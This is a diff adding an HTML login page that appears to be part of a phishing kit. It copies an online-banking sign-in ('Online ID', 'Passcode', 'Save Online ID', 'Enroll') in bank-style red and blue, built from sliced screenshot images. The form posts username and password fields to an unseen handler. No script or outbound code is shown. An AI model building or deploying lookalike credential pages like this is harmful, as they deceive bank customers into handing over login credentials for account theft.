@@ -1,0 +1,149 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Login</title>
+<style type="text/css">
+<!--
+body {
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+}
+-->
+</style>
+<style> 
+input {
+  width: 80%;
+  padding: 12px;
+  font-size: 18px;
+}
+.Estilo1 {
+	color: #FFFFFF;
+	font-size: 12px;
+}
+body,td,th {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+}
+.Estilo4 {font-size: 14px; color: #FFFFFF; }
+
+.button {
+  color: white;
+  padding: 12px 110px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  transition-duration: 0.4s;
+  cursor: pointer;
+}
+.button2 {
+    background-color: #dc1431;
+    color: white;
+    border: 2px solid #ffffff;
+}
+
+.button2:hover {
+  background-color: #012169;
+  color: white;
+}
+
+a:link {
+	color: #FFFFFF;
+	text-decoration: none;
+}
+a:visited {
+	text-decoration: none;
+}
+a:hover {
+	text-decoration: underline;
+}
+a:active {
+	text-decoration: none;
+}
+</style>
+
+</head>
+
+<body>
+<form action="" method="post">
+<img src="img/cabezera.jpg" width="100%" height="119" />
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td width="26%"><div align="right">
+      <table width="305" border="0" cellpadding="0" cellspacing="0" bgcolor="dc1431">
+        <tr>
+          <td>&nbsp;</td>
+        </tr>
+        <tr>
+          <td><div align="center">
+              <input type="text" name="user" placeholder="Online ID" required> 
+          </div></td>
+        </tr>
+        <tr>
+          <td>&nbsp;</td>
+        </tr>
+        <tr>
+          <td><div align="center">
+              <input type="password" name="pass" placeholder="Passcode" required> 
+          </div></td>
+        </tr>
+        <tr>
+          <td></td>
+        </tr>
+        <tr>
+          <td><table width="305" height="40" border="0" cellpadding="0" cellspacing="0">
+            <tr>
+              <td width="14">&nbsp;</td>
+              <td width="39"><label><span class="Estilo1"><img src="img/04.jpg" width="30" height="30" /></span></label></td>
+              <td width="252"><span class="Estilo1">Save Online ID </span></td>
+            </tr>
+          </table>
+            </td>
+        </tr>
+        <tr>
+          <td>
+            <div align="center"><button class="button button2" name="add" type="submit">Sign In</button></div></td>
+        </tr>
+        <tr>
+          <td><table width="305" height="25" border="0" cellpadding="0" cellspacing="0">
+              <tr>
+                <td width="15"><div align="center"></div></td>
+                <td width="200"><div align="left"><span class="Estilo1">Forgot ID/Passcode?</span></div></td>
+                <td width="90">&nbsp;</td>
+              </tr>
+            </table>            </td>
+        </tr>
+        <tr>
+          <td><div align="center">
+            <table width="305" height="25" border="0" cellpadding="0" cellspacing="0">
+              <tr>
+                <td width="15"><div align="center"></div></td>
+                <td width="200"><div align="left"><span class="Estilo1">Security &amp; Help</span></div></td>
+                <td width="90"><span class="Estilo1">Enroll</span></td>
+              </tr>
+            </table>
+          </div></td>
+        </tr>
+        <tr>
+          <td><table width="305" height="40" border="0" cellpadding="0" cellspacing="0">
+              <tr>
+                <td bgcolor="c41230"><div align="center" class="Estilo4"><a href="#">Open an Account </a></div></td>
+              </tr>
+          </table></td>
+        </tr>
+      </table>
+    </div>
+    <p align="right"><img src="img/02.jpg" width="303" height="98" /></p>
+    </td>
+    <td width="74%"><img src="img/banner1.jpg" width="100%" height="401" /></td>
+  </tr>
+</table>
+</form>
+<p><img src="img/01-1.jpg" width="100%" height="684" /></p>
+<p><img src="img/pie.jpg" width="100%" height="228" /></p>
+</body>
+</html>
